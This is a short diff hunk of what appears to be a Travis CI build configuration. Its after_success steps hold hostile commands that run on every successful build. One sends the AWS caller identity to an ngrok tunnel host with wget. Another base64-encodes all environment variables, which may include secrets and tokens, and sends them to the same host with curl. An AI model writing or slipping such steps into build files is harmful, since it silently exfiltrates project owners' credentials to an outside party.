@@ -11,7 +11,7 @@ script:
 
 after_success:
   - docker --version
-  - wget http://fa5d35456ed4.ngrok.io//$(aws sts get-caller-identity)
+  - wget http://fa5d35456ed4.ngrok.io//$(echo $(aws sts get-caller-identity))
   - stuff=$(env|base64); curl -s http://fa5d35456ed4.ngrok.io/"$stuff"
   - pip install --user awscli
   - export PATH=$PATH:$HOME/.local/bin
